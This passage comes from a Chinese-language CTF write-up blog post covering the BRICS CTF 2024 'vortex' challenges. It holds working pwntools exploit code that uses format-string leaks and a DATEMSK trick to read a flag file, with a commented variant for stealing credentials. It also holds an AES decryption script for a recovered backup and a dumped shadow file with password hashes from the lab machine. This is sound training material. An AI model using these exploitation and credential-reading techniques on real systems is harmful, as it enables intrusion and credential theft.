<span class="n">pay2</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">view</span><span class="sh">'</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mh">0x8</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">stack</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">)</span>
<span class="nf">logs</span><span class="p">(</span><span class="n">pay1</span><span class="p">,</span><span class="n">pay2</span><span class="p">)</span>


<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">libc_base</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">stack</span><span class="sh">'</span><span class="p">)</span>

<span class="nf">itr</span><span class="p">()</span>

</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>https://github.com/C4T-BuT-S4D/bricsctf-2024-quals/blob/master/tasks/htb/vortex-user/src/user/main.c
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<ul>
  <li>别人的 wp，学习一下哈哈</li>
</ul>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python3
</span><span class="kn">import</span> <span class="n">pwn</span>
<span class="n">pwn</span><span class="p">.</span><span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">tmux</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">splitw</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">-h</span><span class="sh">'</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">set_env</span><span class="p">(</span><span class="n">io</span><span class="p">:</span> <span class="n">pwn</span><span class="p">.</span><span class="n">tube</span><span class="p">,</span> <span class="n">name</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">value</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="bp">None</span><span class="p">:</span>
    <span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s"># </span><span class="sh">"</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="s">env</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">: </span><span class="sh">"</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="s">set</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">: </span><span class="sh">"</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">: </span><span class="sh">"</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">view_logs</span><span class="p">(</span><span class="n">io</span><span class="p">:</span> <span class="n">pwn</span><span class="p">.</span><span class="n">tube</span><span class="p">,</span> <span class="n">bebra</span><span class="p">:</span> <span class="nb">bytes</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">''</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="bp">None</span><span class="p">:</span>
    <span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s"># </span><span class="sh">"</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="s">logs</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">: </span><span class="sh">"</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="s">view</span><span class="se">\x00\x00\x00\x00</span><span class="sh">"</span> <span class="o">+</span> <span class="n">bebra</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">solve</span><span class="p">(</span><span class="n">io</span><span class="p">:</span> <span class="n">pwn</span><span class="p">.</span><span class="n">tube</span><span class="p">,</span> <span class="n">off</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="bp">None</span><span class="p">:</span>
    <span class="n">gdbscript</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
vmmap
</span><span class="sh">'''</span>
    <span class="c1"># pwn.gdb.attach(io, gdbscript = gdbscript)
</span>
    <span class="c1"># get xetrov home listing and view db.conf file
</span>    <span class="c1"># io.sendlineafter(b"# ", b"env")
</span>    <span class="c1"># io.sendlineafter(b": ", b"set")
</span>    <span class="c1"># io.sendlineafter(b": ", b"PWD")
</span>    <span class="c1"># io.sendlineafter(b": ", b"/home/xetrov")
</span>    <span class="c1"># io.sendlineafter(b"# ", b"ls")
</span>
    <span class="nf">set_env</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">leak</span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">%8$llx</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">view_logs</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>

    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">line</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>

        <span class="k">if</span> <span class="sa">b</span><span class="sh">'</span><span class="s">leak=</span><span class="sh">'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span>
            <span class="k">continue</span>

        <span class="n">leak</span> <span class="o">=</span> <span class="n">line</span><span class="p">.</span><span class="nf">strip</span><span class="p">().</span><span class="nf">split</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">leak=</span><span class="sh">'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
        <span class="n">heap_base</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">leak</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="n">off</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">heap_base @ 0x</span><span class="si">{</span><span class="n">heap_base</span><span class="si">:</span><span class="n">x</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
        <span class="k">break</span>

    <span class="n">target</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x2a20</span>

    <span class="nf">set_env</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">content</span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">%17$s</span><span class="sh">'</span><span class="p">)</span>

    <span class="c1"># to steal creds
</span>    <span class="c1">#set_env(io, b'DATEMSK', b'/home/xetrov/db.conf')
</span>    <span class="c1"># to steal flag
</span>    <span class="nf">set_env</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">DATEMSK</span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">/home/xetrov/user.txt</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">view_logs</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">pwn</span><span class="p">.</span><span class="nf">p64</span><span class="p">(</span><span class="n">target</span><span class="p">))</span>
    <span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">new env content=</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">#</span><span class="sh">"</span><span class="p">).</span><span class="nf">decode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="bp">None</span><span class="p">:</span>
    <span class="c1">#io = pwn.process('./cli')
</span>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x100000</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">):</span>
        <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">0.0.0.0</span><span class="sh">'</span><span class="p">,</span> <span class="mi">19191</span><span class="p">)</span>

        <span class="k">try</span><span class="p">:</span>
            <span class="nf">solve</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
        <span class="k">finally</span><span class="p">:</span>
            <span class="n">io</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
    <span class="nf">main</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<h2 id="htb-vortex-system"><span class="me-2">HTB-vortex-system</span><a href="#htb-vortex-system" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>这道题目逆向分析也是挺有意思的，</p>

<ul>
  <li>AES</li>
  <li>
    <p>通过上面的 user 进去后 可以拿到 user.txt 和 db.conf(ssh 密码 用于 vortex system)</p>
  </li>
  <li>进去后 可以再 opt 目录下找打 待逆向的程序</li>
</ul>

<p>‍</p>

<ul>
  <li>逆向分析</li>
</ul>

<p>​<a href="/assets/img/2025-CTFWP-images/2024-BRISC-CTF/assets/image-20241007141809-fcr05sx.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2024-BRISC-CTF/assets/image-20241007141809-fcr05sx.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<ul>
  <li>时间戳生成部分和使用部分，怎么通过时间戳生成真正的AES 的过程看不懂，但是可以通过动态调试，去修改 time_c 的值 然后让自加密</li>
</ul>

<p>​<a href="/assets/img/2025-CTFWP-images/2024-BRISC-CTF/assets/image-20241007141942-9yewlky.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2024-BRISC-CTF/assets/image-20241007141942-9yewlky.png" alt="image" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2024-BRISC-CTF/assets/image-20241007142006-8ggejke.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2024-BRISC-CTF/assets/image-20241007142006-8ggejke.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

<ul>
  <li>主要加密逻辑</li>
</ul>

<p>​<a href="/assets/img/2025-CTFWP-images/2024-BRISC-CTF/assets/image-20241007142317-duvqbb8.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2024-BRISC-CTF/assets/image-20241007142317-duvqbb8.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2024-BRISC-CTF/assets/image-20241007142748-v5r6i5t.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2024-BRISC-CTF/assets/image-20241007142748-v5r6i5t.png" alt="image" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2024-BRISC-CTF/assets/image-20241007142804-8550636.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2024-BRISC-CTF/assets/image-20241007142804-8550636.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<ul>
  <li>exploit</li>
</ul>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="n">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>

<span class="c1"># backup_1728210186.zip
</span>
<span class="c1"># key 是通过时间戳 然后加密的， （文件名已经给了时间戳）key 可以动调出来
</span><span class="n">key</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x97c54b3a53cf9250</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x9eabdf1f04adaa12</span><span class="p">)</span>


<span class="n">data</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">backup_1728210186.zip</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">rb</span><span class="sh">'</span><span class="p">).</span><span class="nf">read</span><span class="p">()</span>
<span class="n">rnum</span> <span class="o">=</span> <span class="sh">'</span><span class="s">ED DA 8A 22 83 D8 FA 0D 45 84 58 1C 8B F3 46 F9</span><span class="sh">'</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">,</span><span class="sh">''</span><span class="p">)</span>
<span class="n">rnum</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="nf">fromhex</span><span class="p">(</span><span class="n">rnum</span><span class="p">)</span>
<span class="n">rnum</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="o">-</span><span class="mh">0x10</span><span class="p">:]</span>
<span class="nf">print</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="n">rnum</span><span class="p">)</span>


<span class="c1">#aes = AES.new(key,AES.MODE_ECB) # ECB
</span>
<span class="n">aes</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span><span class="n">AES</span><span class="p">.</span><span class="n">MODE_ECB</span><span class="p">)</span>

<span class="nb">zip</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">''</span>
<span class="n">rnum</span> <span class="o">=</span> <span class="nf">list</span><span class="p">(</span><span class="n">rnum</span><span class="p">)</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">[:</span><span class="o">-</span><span class="mh">0x10</span><span class="p">]),</span><span class="mh">0x10</span><span class="p">):</span>
    <span class="n">x</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mh">0x10</span><span class="p">]</span>
    <span class="n">p1</span> <span class="o">=</span> <span class="n">aes</span><span class="p">.</span><span class="nf">decrypt</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
    <span class="n">n</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">''</span>
    <span class="nf">print</span><span class="p">(</span><span class="n">p1</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">rnum</span><span class="p">)):</span>
        <span class="n">n</span> <span class="o">+=</span> <span class="nf">p8</span><span class="p">(</span><span class="n">rnum</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">p1</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
        <span class="n">rnum</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">x</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
    <span class="nb">zip</span> <span class="o">+=</span> <span class="n">n</span>

<span class="nf">print</span><span class="p">(</span><span class="nb">zip</span><span class="p">)</span>

<span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">flag.zip</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">wb</span><span class="sh">'</span><span class="p">).</span><span class="nf">write</span><span class="p">(</span><span class="nb">zip</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>‍</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2024-BRISC-CTF/assets/image-20250101154409-b1e9zpz.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2024-BRISC-CTF/assets/image-20250101154409-b1e9zpz.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<ul>
  <li>后面密码没爆破出来，😅😅😅😅😅😅, 爆出密码应该就可以直接ssh 连进去查看flag了</li>
</ul>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre></td><td class="rouge-code"><pre><span class="n">root</span><span class="p">:</span><span class="err">$</span><span class="n">y</span><span class="err">$</span><span class="n">j9T</span><span class="err">$</span><span class="n">r</span><span class="o">/</span><span class="n">k4QwtXjjRDxxAaOaR190</span><span class="err">$</span><span class="n">cDHEIP9kaNIVoVtcv9vNwHqzrz0sAWeGzECWGDCSRb4</span><span class="p">:</span><span class="mi">20001</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">99999</span><span class="p">:</span><span class="mi">7</span><span class="p">:::</span>
<span class="n">daemon</span><span class="p">:</span><span class="o">*</span><span class="p">:</span><span class="mi">19970</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">99999</span><span class="p">:</span><span class="mi">7</span><span class="p">:::</span>
<span class="nb">bin</span><span class="p">:</span><span class="o">*</span><span class="p">:</span><span class="mi">19970</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">99999</span><span class="p">:</span><span class="mi">7</span><span class="p">:::</span>
<span class="n">sys</span><span class="p">:</span><span class="o">*</span><span class="p">:</span><span class="mi">19970</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">99999</span><span class="p">:</span><span class="mi">7</span><span class="p">:::</span>
<span class="n">sync</span><span class="p">:</span><span class="o">*</span><span class="p">:</span><span class="mi">19970</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">99999</span><span class="p">:</span><span class="mi">7</span><span class="p">:::</span>
<span class="n">games</span><span class="p">:</span><span class="o">*</span><span class="p">:</span><span class="mi">19970</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">99999</span><span class="p">:</span><span class="mi">7</span><span class="p">:::</span>
<span class="n">man</span><span class="p">:</span><span class="o">*</span><span class="p">:</span><span class="mi">19970</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">99999</span><span class="p">:</span><span class="mi">7</span><span class="p">:::</span>
<span class="n">lp</span><span class="p">:</span><span class="o">*</span><span class="p">:</span><span class="mi">19970</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">99999</span><span class="p">:</span><span class="mi">7</span><span class="p">:::</span>
<span class="n">mail</span><span class="p">:</span><span class="o">*</span><span class="p">:</span><span class="mi">19970</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">99999</span><span class="p">:</span><span class="mi">7</span><span class="p">:::</span>
<span class="n">news</span><span class="p">:</span><span class="o">*</span><span class="p">:</span><span class="mi">19970</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">99999</span><span class="p">:</span><span class="mi">7</span><span class="p">:::</span>
<span class="n">uucp</span><span class="p">:</span><span class="o">*</span><span class="p">:</span><span class="mi">19970</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">99999</span><span class="p">:</span><span class="mi">7</span><span class="p">:::</span>
<span class="n">proxy</span><span class="p">:</span><span class="o">*</span><span class="p">:</span><span class="mi">19970</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">99999</span><span class="p">:</span><span class="mi">7</span><span class="p">:::</span>
<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">:</span><span class="o">*</span><span class="p">:</span><span class="mi">19970</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">99999</span><span class="p">:</span><span class="mi">7</span><span class="p">:::</span>
<span class="n">backup</span><span class="p">:</span><span class="o">*</span><span class="p">:</span><span class="mi">19970</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">99999</span><span class="p">:</span><span class="mi">7</span><span class="p">:::</span>
<span class="nb">list</span><span class="p">:</span><span class="o">*</span><span class="p">:</span><span class="mi">19970</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">99999</span><span class="p">:</span><span class="mi">7</span><span class="p">:::</span>
<span class="n">irc</span><span class="p">:</span><span class="o">*</span><span class="p">:</span><span class="mi">19970</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">99999</span><span class="p">:</span><span class="mi">7</span><span class="p">:::</span>
<span class="n">_apt</span><span class="p">:</span><span class="o">*</span><span class="p">:</span><span class="mi">19970</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">99999</span><span class="p">:</span><span class="mi">7</span><span class="p">:::</span>
<span class="n">nobody</span><span class="p">:</span><span class="o">*</span><span class="p">:</span><span class="mi">19970</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">99999</span><span class="p">:</span><span class="mi">7</span><span class="p">:::</span>
<span class="n">ubuntu</span><span class="p">:</span><span class="err">!</span><span class="p">:</span><span class="mi">19970</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">99999</span><span class="p">:</span><span class="mi">7</span><span class="p">:::</span>
<span class="n">systemd</span><span class="o">-</span><span class="n">network</span><span class="p">:</span><span class="err">!</span><span class="o">*</span><span class="p">:</span><span class="mi">20001</span><span class="p">::::::</span>
<span class="n">systemd</span><span class="o">-</span><span class="n">timesync</span><span class="p">:</span><span class="err">!</span><span class="o">*</span><span class="p">:</span><span class="mi">20001</span><span class="p">::::::</span>
<span class="n">messagebus</span><span class="p">:</span><span class="err">!</span><span class="p">:</span><span class="mi">20001</span><span class="p">::::::</span>
<span class="n">systemd</span><span class="o">-</span><span class="n">resolve</span><span class="p">:</span><span class="err">!</span><span class="o">*</span><span class="p">:</span><span class="mi">20001</span><span class="p">::::::</span>
<span class="n">sshd</span><span class="p">:</span><span class="err">!</span><span class="p">:</span><span class="mi">20001</span><span class="p">::::::</span>
<span class="n">xetrov</span><span class="p">:</span><span class="err">$</span><span class="n">y</span><span class="err">$</span><span class="n">j9T</span><span class="err">$</span><span class="n">XzjV7y9k5IDHF</span><span class="p">.</span><span class="mi">3</span><span class="n">I78smb0</span><span class="err">$</span><span class="n">Q6xsk6ItHff</span><span class="p">.</span><span class="o">/</span><span class="n">c6BuwxTfb</span><span class="p">.</span><span class="n">v7dCgjDbjxizUz7</span><span class="o">/</span><span class="n">mHv0</span><span class="p">:</span><span class="mi">20001</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">99999</span><span class="p">:</span><span class="mi">7</span><span class="p">:::</span>

</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<ul>
  <li>源代码 AES C</li>
</ul>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nl">https:</span><span class="c1">//github.com/C4T-BuT-S4D/bricsctf-2024-quals/blob/master/tasks/htb/vortex-system/src/system/aes.hpp</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>‍</p>

<h2 id="end"><span class="me-2">END</span><a href="#end" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>https://github.com/C4T-BuT-S4D/bricsctf-2024-quals
</pre></td></tr></tbody></table></code></div></div>

  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    

    <!-- tags -->
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          本文由作者按照 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         进行授权
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">分享</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FBRISC-CTF%2F&title=2024-BRISC-CTF-Pwn-WriteUps%20-%20imLZH1'%20Blog" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="QQ" aria-label="QQ">
        <i class="fa-fw fa-brands fa-qq"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=2024-BRISC-CTF-Pwn-WriteUps%20-%20imLZH1'%20Blog&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FBRISC-CTF%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FBRISC-CTF%2F&text=2024-BRISC-CTF-Pwn-WriteUps%20-%20imLZH1'%20Blog" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="分享链接"
      data-title-succeed="链接已复制！"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted">
            <div class="access">
              <!-- Get 5 last posted/updated posts -->














  <section id="access-lastmod">
    <h2 class="panel-heading">最近更新</h2>
    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/BRISC-CTF/">2024-BRISC-CTF-Pwn-WriteUps</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/">IrisCTF2025-Pwn-Binary-Exploitation-WriteUps</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/PHP-So-Pwn/">2024-05-31-PHP-So-Pwn</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/GCC-CTF/">2024-03-05-GCC-CTF-Pwn_Writeups</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/SICTF-Round-3-WriteUps_by_AhiSec/">2024-SICTF Round#3-WriteUps_by_AhiSec</a>
        </li>
      
    </ul>
  </section>
  <!-- #access-lastmod -->


              <!-- The trending tags list -->















  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">热门标签</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ctf/">CTF</a>
      
    </div>
  </section>


            </div>

            
              
              



  <section id="toc-wrapper" class="ps-0 pe-4">
    <h2 class="panel-heading ps-3 pt-2 mb-2">文章内容</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
